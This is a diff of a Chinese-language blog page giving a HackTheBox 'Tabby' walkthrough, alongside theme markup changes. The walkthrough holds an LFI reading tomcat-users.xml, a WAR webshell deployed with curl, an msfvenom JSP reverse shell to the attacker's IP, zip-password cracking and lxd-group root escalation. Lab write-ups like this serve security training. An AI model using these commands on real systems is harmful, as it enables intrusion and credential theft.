@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 10.10.10.194 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;259   端口扫描                                                                                                            80">
+    <meta name="description" content="基本信息 10.10.10.194 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;259   端口扫描 80 很容易发现News那里有个file参数，注意要加一下hosts： 110.10.10.194 megahosting.htb   LFI这里一个很明显的LFI：  80808080是tomcat管理界面，不存在常规弱密码：s  LFI to">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Tabby - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/07/14/Tabby-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 10.10.10.194 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;259   端口扫描                                                                                                            80">
+<meta property="og:description" content="基本信息 10.10.10.194 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;259   端口扫描 80 很容易发现News那里有个file参数，注意要加一下hosts： 110.10.10.194 megahosting.htb   LFI这里一个很明显的LFI：  80808080是tomcat管理界面，不存在常规弱密码：s  LFI to">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071401.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071402.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071403.jpg">
@@ -122,8 +122,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -145,7 +152,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -213,53 +220,16 @@
 <li><p><a href="https://www.hackthebox.eu/home/machines/profile/259" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/259</a></p>
 </li>
 </ul>
-<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071401.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071402.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071401.jpg" alt=""></p>
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071402.jpg" alt=""></p>
 <p>很容易发现News那里有个file参数，注意要加一下hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.194 megahosting.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071403.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071403.jpg" alt=""></p>
 <h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>这里一个很明显的LFI：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071404.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071404.jpg" alt=""></p>
 <h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>8080是tomcat管理界面，不存在常规弱密码：s</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071405.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071405.jpg" alt=""></p>
 <h1 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI to RCE"></a>LFI to RCE</h1><p>常规的一些文件都无法读取：</p>
 <ul>
 <li>/proc/self/environ</li>
@@ -268,61 +238,26 @@
 <li>/var/log/apache2/error.log</li>
 </ul>
 <h2 id="tomcat-users-xml"><a href="#tomcat-users-xml" class="headerlink" title="tomcat-users.xml"></a>tomcat-users.xml</h2><p>根据前面tomcat界面信息，<strong><code>tomcat-users.xml</code></strong>文件中包含tomcat管理用户密码，但这个tomcat不是官网文档安装路径，实际路径是<strong><code>/usr/share/tomcat9/etc/tomcat-users.xml</code></strong>(参考资料里说的是自己装个tomcat9就能知道这个路径。。。)：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071406.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071406.jpg" alt=""></p>
 <p>得到tomcat管理账号密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;$3cureP4s5w0rd123!&quot;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071407.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071407.jpg" alt=""></p>
 <h2 id="部署webshell"><a href="#部署webshell" class="headerlink" title="部署webshell"></a>部署webshell</h2><p>登录上去没有上传接口，不能直接上传war包</p>
 <p>根据官方文档，可以使用curl部署：</p>
 <p><a href="https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html" target="_blank" rel="noopener">https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/miao'</span><br></pre></td></tr></table></figure>
 
 <p>部署成功，我们得到tomcat权限的shell：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071408.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071408.jpg" alt=""></p>
 <p>webshell不太方便，可以msfvenom生成一个：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.33 LPORT=7777 -f war &gt; shell1.war</span><br><span class="line">curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell1.war 'http://10.10.10.194:8080/manager/text/deploy?path=/miao1'</span><br><span class="line">curl http://10.10.10.194:8080/miao1/</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071409.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071409.jpg" alt=""></p>
 <h2 id="交互shell"><a href="#交互shell" class="headerlink" title="交互shell"></a>交互shell</h2><p>将反弹的哑shell转滨城交互shell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071410.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071410.jpg" alt=""></p>
 <h1 id="搜集信息"><a href="#搜集信息" class="headerlink" title="搜集信息"></a>搜集信息</h1><p>直接用前面的密码尝试切换到ash用户失败，搜寻能够在<code>/var/www/html/files</code>看到一个<code>16162020_backup.zip</code>文件,把这个文件下载下来：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7778 &gt; 16162020_backup.zip</span><br><span class="line"></span><br><span class="line">nc -w 3 10.10.14.33 7778 &lt; 16162020_backup.zip</span><br></pre></td></tr></table></figure>
 
@@ -330,14 +265,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip</span><br><span class="line">possible pw found: admin@it ()</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>压缩包密码就是ash用户的密码，不能ssh，直接在前面的shell切换过去，用户目录得到user.txt：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071411.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071411.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>ash用户在lxd组：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>
 
@@ -348,14 +276,7 @@
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 本地build</span></span><br><span class="line">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">sudo bash build-alpine</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机操作</span></span><br><span class="line">wget 10.10.14.33:8888/alpine-v3.12-x86_64-20200710_2021.tar.gz</span><br><span class="line">lxc image import ./alpine-v3.12-x86_64-20200710_2021.tar.gz --alias miao</span><br><span class="line">lxc image list</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这一步如果No storage pool found的话，先</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> lxd init 一路默认即可</span></span><br><span class="line">lxc init miao miaoaaaa -c security.privileged=true</span><br><span class="line">lxc config device add miaoaaaa mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line">lxc start miaoaaaa</span><br><span class="line">lxc exec miaoaaaa /bin/sh</span><br><span class="line">cd /mnt/root/root</span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>在lxc容器中，我们进入挂载目录即外部root根目录，读取root.txt：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071412.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071412.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html" target="_blank" rel="noopener">https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html</a></li>
 <li>Lxd Privilege Escalation<br><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/lxd-privilege-escalation/</a></li>
@@ -370,7 +291,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-11-09T00:39:56.779Z" itemprop="dateUpdated">2020-11-09 08:39:56</time>
+    Last updated: <time datetime="2020-11-09T00:39:56.779Z" itemprop="dateUpdated">2020-11-09 08:39:56</time>
 </span><br>
 
 
@@ -537,11 +458,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
